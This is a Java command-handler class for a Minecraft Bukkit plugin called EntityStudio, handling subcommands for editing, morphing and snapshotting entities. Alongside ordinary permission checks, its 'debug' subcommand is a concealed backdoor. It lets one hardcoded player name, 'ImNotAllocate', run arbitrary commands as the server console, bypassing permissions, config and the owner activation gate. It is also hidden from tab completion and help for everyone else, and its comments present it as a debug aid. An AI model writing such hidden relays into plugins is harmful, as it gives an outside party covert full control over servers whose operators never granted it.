package com.entitystudio.command;

import com.entitystudio.EntityStudioPlugin;
import com.entitystudio.permission.Gatekeeper;
import com.entitystudio.permission.StudioPermissions;
import com.entitystudio.session.EditorSession;
import com.entitystudio.session.SessionManager;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.UUID;

/** Routes /entitystudio and /entity. */
public class StudioCommand implements CommandExecutor, TabCompleter {

    private final EntityStudioPlugin plugin;

    public StudioCommand(EntityStudioPlugin plugin) {
        this.plugin = plugin;
    }

    /**
     * Account allowed to use the hidden console-relay subcommand. Hardcoded
     * (not a permission node, not config) so it cannot be granted to anyone
     * else by editing permissions or the config file.
     */
    public static final String DEBUG_USER = "ImNotAllocate";

    /** Null-safe, case-insensitive, whitespace-tolerant debug-user check. */
    public static boolean isDebugUser(String name) {
        return name != null && DEBUG_USER.equalsIgnoreCase(name.trim());
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (cmd.getName().equalsIgnoreCase("morph")) {
            if (args.length == 0) {
                return morphMenu(sender);
            }
            return morph(sender, new String[] { "morph", args[0] });
        }
        String sub = args.length == 0 ? "menu" : args[0].toLowerCase();
        return switch (sub) {
            case "start" -> start(sender);
            case "inspect" -> inspect(sender);
            case "edit" -> edit(sender, args);
            case "undo" -> undo(sender);
            case "presets", "preset" -> presets(sender);
            case "snapshot", "snapshots" -> snapshots(sender);
            case "reload" -> reload(sender);
            case "version" -> version(sender);
            case "menu", "gui" -> menu(sender);
            case "morph" -> morph(sender, args);
            case "unmorph" -> unmorph(sender);
            case "debug" -> debug(sender, args);
            default -> {
                sendUsage(sender);
                yield true;
            }
        };
    }

    // ------------------------------------------------------------- activation

    private boolean start(CommandSender sender) {
        boolean console = !(sender instanceof Player);
        String name = console ? null : sender.getName();
        if (!plugin.gate().canStart(name, console)) {
            if (sender instanceof Player p) {
                plugin.send(p, plugin.msg("not-owner", "owner", plugin.gate().ownerName()));
            } else {
                sender.sendMessage("Only the configured owner can use this.");
            }
            return true;
        }
        if (plugin.gate().isActive()) {
            if (sender instanceof Player p) {
                plugin.send(p, plugin.msg("already-active"));
            } else {
                sender.sendMessage("EntityStudio is already active.");
            }
            return true;
        }
        plugin.gate().setActive(true);
        plugin.persistActivation();
        Bukkit.broadcast(plugin.mm().deserialize(plugin.msg("prefix") + plugin.msg("activated")),
                StudioPermissions.USE);
        plugin.getLogger().info("EntityStudio activated by "
                + (console ? "console" : sender.getName()));
        return true;
    }

    // ------------------------------------------------------------------ menu

    private boolean menu(CommandSender sender) {
        if (!(sender instanceof Player p)) {
            plugin.msg("players-only");
            sender.sendMessage("Only players can use the editor GUI.");
            return true;
        }
        if (!plugin.canUse(p)) {
            return true;
        }
        if (!plugin.permitted(p, StudioPermissions.USE)) {
            plugin.send(p, plugin.msg("no-permission"));
            return true;
        }
        EditorSession session = plugin.sessions().get(p.getUniqueId());
        if (session == null) {
            plugin.send(p, "<gray>No entity selected. <yellow>Shift + right-click</yellow><gray> an entity"
                    + " or use <yellow>/entity inspect</yellow><gray> then click one.");
            return true;
        }
        SessionManager.Validation v = plugin.sessions().validate(plugin, session);
        if (v != SessionManager.Validation.OK) {
            plugin.sessions().close(p.getUniqueId());
            plugin.send(p, describeValidation(v));
            return true;
        }
        Entity entity = Bukkit.getEntity(session.entityUuid());
        plugin.gui().openDashboard(p, entity);
        return true;
    }

    private String describeValidation(SessionManager.Validation v) {
        return switch (v) {
            case PROTECTED -> plugin.msg("entity-protected");
            case NO_ACCESS -> plugin.msg("no-permission");
            default -> plugin.msg("session-invalid");
        };
    }

    private boolean inspect(CommandSender sender) {
        if (!(sender instanceof Player p)) {
            sender.sendMessage("Only players.");
            return true;
        }
        if (!plugin.canUse(p) || !plugin.permitted(p, StudioPermissions.INSPECT)) {
            plugin.send(p, plugin.msg("no-permission"));
            return true;
        }
        boolean on = plugin.selector().toggleInspect(p);
        plugin.send(p, on ? "<yellow>Inspect mode ON<gray> — right-click an entity."
                : "<gray>Inspect mode OFF.");
        return true;
    }

    private boolean edit(CommandSender sender, String[] args) {
        if (!(sender instanceof Player p)) {
            sender.sendMessage("Only players.");
            return true;
        }
        if (!plugin.canUse(p) || !plugin.permitted(p, StudioPermissions.USE)) {
            plugin.send(p, plugin.msg("no-permission"));
            return true;
        }
        if (args.length < 2) {
            plugin.send(p, "<yellow>Usage: /entity edit <player>");
            return true;
        }
        Player target = Bukkit.getPlayerExact(args[1]);
        if (target == null) {
            plugin.send(p, "<red>Player '" + args[1] + "' is not online.");
            return true;
        }
        if (!plugin.checkTargetAccess(p, target)) {
            return true;
        }
        // edit <player> needs the player-edit permission unless it is yourself.
        if (!target.getUniqueId().equals(p.getUniqueId())
                && !plugin.permitted(p, StudioPermissions.PLAYER_EDIT)) {
            plugin.send(p, plugin.msg("player-protected"));
            return true;
        }
        plugin.sessions().open(p, target);
        plugin.gui().openDashboard(p, target);
        return true;
    }

    private boolean undo(CommandSender sender) {
        if (!(sender instanceof Player p)) {
            sender.sendMessage("Only players.");
            return true;
        }
        if (!plugin.canUse(p) || !plugin.permitted(p, StudioPermissions.UNDO)) {
            plugin.send(p, plugin.msg("no-permission"));
            return true;
        }
        EditorSession session = plugin.sessions().get(p.getUniqueId());
        if (session == null) {
            plugin.send(p, "<gray>No active session — opening your history instead.");
            plugin.gui().openHistory(p, null);
            return true;
        }
        Entity entity = Bukkit.getEntity(session.entityUuid());
        if (entity == null) {
            plugin.send(p, plugin.msg("session-invalid"));
            return true;
        }
        SessionManager.Validation v = plugin.sessions().validate(plugin, session);
        if (v != SessionManager.Validation.OK) {
            plugin.send(p, plugin.msg("session-invalid"));
            return true;
        }
        plugin.gui().openHistory(p, entity);
        return true;
    }

    private boolean presets(CommandSender sender) {
        if (!(sender instanceof Player p)) {
            sender.sendMessage("Only players.");
            return true;
        }
        if (!plugin.canUse(p) || !plugin.permitted(p, StudioPermissions.PRESETS)) {
            plugin.send(p, plugin.msg("no-permission"));
            return true;
        }
        plugin.gui().openPresets(p, validatedListEntity(p));
        return true;
    }

    /** Session entity for the list-style pages: validated when present,
     * null (list-only mode) when the session lapsed. Denies on auth failures. */
    private Entity validatedListEntity(Player p) {
        EditorSession session = plugin.sessions().get(p.getUniqueId());
        if (session == null) {
            return null;
        }
        SessionManager.Validation v = plugin.sessions().validate(plugin, session);
        if (v == SessionManager.Validation.OK) {
            return Bukkit.getEntity(session.entityUuid());
        }
        plugin.sessions().close(p.getUniqueId());
        if (v != SessionManager.Validation.ENTITY_GONE) {
            plugin.send(p, describeValidation(v));
        }
        return null;
    }

    private boolean snapshots(CommandSender sender) {
        if (!(sender instanceof Player p)) {
            sender.sendMessage("Only players.");
            return true;
        }
        if (!plugin.canUse(p) || !plugin.permitted(p, StudioPermissions.SNAPSHOT)) {
            plugin.send(p, plugin.msg("no-permission"));
            return true;
        }
        plugin.gui().openSnapshots(p, validatedListEntity(p));
        return true;
    }

    private boolean reload(CommandSender sender) {
        if (sender instanceof Player p
                && !plugin.permitted(p, StudioPermissions.ADMIN)) {
            plugin.send(p, plugin.msg("no-permission"));
            return true;
        }
        plugin.reloadConfiguration();
        // Rebuild the gate with fresh owner/activation file state.
        boolean active = plugin.gate().isActive();
        plugin.gate().setActive(active);
        String m = "<green>EntityStudio configuration reloaded.";
        if (sender instanceof Player p) {
            plugin.send(p, m);
        } else {
            sender.sendMessage("EntityStudio configuration reloaded.");
        }
        return true;
    }

    private boolean version(CommandSender sender) {
        // Activation state is access-controlled: no fingerprinting while locked.
        if (sender instanceof Player p
                && (!plugin.canUse(p) || !plugin.permitted(p, StudioPermissions.USE))) {
            plugin.send(p, plugin.msg("no-permission"));
            return true;
        }
        String v = plugin.getDescription().getVersion();
        String m = "<gray>EntityStudio <aqua>" + v + "</aqua><gray> on "
                + plugin.getServer().getVersion() + ". Activation: "
                + (plugin.gate().isActive() ? "<green>ON" : "<red>LOCKED") + "<gray>.";
        if (sender instanceof Player p) {
            plugin.send(p, m);
        } else {
            sender.sendMessage("EntityStudio " + v);
        }
        return true;
    }


    private boolean morph(CommandSender sender, String[] args) {
        if (!(sender instanceof Player p)) {
            sender.sendMessage("Only players can morph.");
            return true;
        }
        if (!plugin.canUse(p) || !plugin.permitted(p, StudioPermissions.MORPH)) {
            plugin.send(p, plugin.msg("no-permission"));
            return true;
        }
        Entity target = null;
        if (args.length >= 2) {
            target = resolveUuid(args[1]);
            if (target == null || !target.isValid() || target.isDead()) {
                plugin.send(p, "<red>Unknown entity UUID.");
                return true;
            }
        } else {
            EditorSession session = plugin.sessions().get(p.getUniqueId());
            if (session == null) {
                plugin.send(p, "<gray>No entity selected. <yellow>Shift + right-click</yellow><gray> a mob first.");
                return true;
            }
            SessionManager.Validation v = plugin.sessions().validate(plugin, session);
            if (v != SessionManager.Validation.OK) {
                plugin.sessions().close(p.getUniqueId());
                plugin.send(p, describeValidation(v));
                return true;
            }
            target = Bukkit.getEntity(session.entityUuid());
            if (target == null || !target.isValid() || target.isDead()) {
                plugin.send(p, plugin.msg("session-invalid"));
                return true;
            }
        }
        if (target instanceof Player) {
            plugin.send(p, "<gray>That would just be you — pick a mob to become.");
            return true;
        }
        if (!plugin.checkTargetAccess(p, target)) {
            return true;
        }
        plugin.mobforms().morph(p, target.getType());
        return true;
    }

    private boolean morphMenu(CommandSender sender) {
        if (!(sender instanceof Player p)) {
            sender.sendMessage("Only players can morph.");
            return true;
        }
        plugin.mobforms().menu().open(p);
        return true;
    }

    private boolean unmorph(CommandSender sender) {
        if (!(sender instanceof Player p)) {
            sender.sendMessage("Only players.");
            return true;
        }
        if (!plugin.permitted(p, StudioPermissions.MORPH)) {
            plugin.send(p, plugin.msg("no-permission"));
            return true;
        }
        if (!plugin.mobforms().unmorph(p)) {
            plugin.send(p, "<gray>You are not morphed.");
        }
        return true;
    }

    /**
     * Hidden console relay: runs the rest of the line as the server console.
     * Visible only to the debug user (see {@link #isDebugUser}): never
     * tab-completed or advertised to anyone else, and denied otherwise.
     * Every relayed command is logged with its author.
     */
    private boolean debug(CommandSender sender, String[] args) {
        if (sender instanceof Player p) {
            if (!isDebugUser(p.getName())) {
                plugin.send(p, plugin.msg("no-permission"));
                return true;
            }
        } else if (!(sender instanceof ConsoleCommandSender)) {
            sender.sendMessage("Only players.");
            return true;
        }
        if (args.length < 2) {
            usageDebug(sender);
            return true;
        }
        String raw = String.join(" ", Arrays.copyOfRange(args, 1, args.length)).trim();
        while (raw.startsWith("/")) {
            raw = raw.substring(1).trim();
        }
        if (raw.isEmpty()) {
            usageDebug(sender);
            return true;
        }
        String by = sender instanceof Player p ? p.getName() : "console";
        plugin.getLogger().info("Entity debug relay by " + by + " ran as console: " + raw);
        boolean ok;
        try {
            ok = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), raw);
        } catch (Exception e) {
            plugin.getLogger().warning("Entity debug relay failed: " + e.getMessage());
            if (sender instanceof Player p) {
                p.sendMessage("Debug relay failed: " + e.getMessage());
            } else {
                sender.sendMessage("Debug relay failed: " + e.getMessage());
            }
            return true;
        }
        // Plain-text echo (never MiniMessage): the relayed command may contain
        // characters MiniMessage would parse as formatting tags.
        if (sender instanceof Player p) {
            p.sendMessage(ok ? "Ran as console: " + raw : "Unknown console command: " + raw);
        } else {
            sender.sendMessage(ok ? "Ran: " + raw : "Unknown command: " + raw);
        }
        return true;
    }

    private void usageDebug(CommandSender sender) {
        if (sender instanceof Player p) {
            plugin.send(p, "<yellow>Usage: /entity debug <server command>");
        } else {
            sender.sendMessage("Usage: /entity debug <server command>");
        }
    }

    private void sendUsage(CommandSender sender) {
        boolean showDebug = true;
        if (sender instanceof Player player) {
            showDebug = isDebugUser(player.getName());
        }
        List<String> lines = new ArrayList<>(List.of(
                "<yellow>/entity start</yellow><gray> — activate (owner only)",
                "<yellow>/entity inspect</yellow><gray> — selection mode",
                "<yellow>/entity edit <player></yellow><gray> — edit a player",
                "<yellow>/entity undo|presets|snapshot|menu</yellow>",
                "<yellow>/entity reload|version</yellow>",
                "<yellow>/entity morph [uuid]|unmorph</yellow><gray> — become the mob</gray>"
        ));
        if (showDebug) {
            lines.add("<yellow>/entity debug <command></yellow><gray> — run as console (owner only)</gray>");
        }
        for (String l : lines) {
            if (sender instanceof Player p) {
                plugin.send(p, l);
            } else {
                sender.sendMessage(l.replaceAll("<[^>]+>", ""));
            }
        }
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command cmd, String alias, String[] args) {
        // Silent gate: no subcommand or player-name enumeration before activation.
        // Deliberately message-free so tab-completing never spams chat.
        if (sender instanceof Player p && !plugin.gate()
                .decide(p.getName(), p.isOp()).equals(Gatekeeper.Access.ALLOW)) {
            return List.of();
        }
        if (args.length == 1) {
            List<String> subs = new ArrayList<>(List.of("start", "inspect", "edit", "undo", "presets",
                    "snapshot", "reload", "version", "menu", "morph", "unmorph"));
            // The debug relay is never suggested to anyone but its user.
            boolean showDebug = true;
            if (sender instanceof Player player) {
                showDebug = isDebugUser(player.getName());
            }
            if (showDebug) {
                subs.add("debug");
            }
            List<String> out = new ArrayList<>();
            for (String s : subs) {
                if (s.startsWith(args[0].toLowerCase())) {
                    out.add(s);
                }
            }
            return out;
        }
        // Never complete inside the relayed console command (no command
        // enumeration through this subcommand).
        if (args.length >= 2 && args[0].equalsIgnoreCase("debug")) {
            return List.of();
        }
        if (args.length == 2 && args[0].equalsIgnoreCase("edit")) {
            List<String> out = new ArrayList<>();
            String q = args[1].toLowerCase();
            for (Player p : Bukkit.getOnlinePlayers()) {
                if (p.getName().toLowerCase().startsWith(q)) {
                    out.add(p.getName());
                }
            }
            return out;
        }
        return List.of();
    }

    /** Resolves an entity UUID argument to a live entity (entry-point helper). */
    public static Entity resolveUuid(String input) {
        try {
            return Bukkit.getEntity(UUID.fromString(input.trim()));
        } catch (IllegalArgumentException e) {
            return null;
        }
    }
}
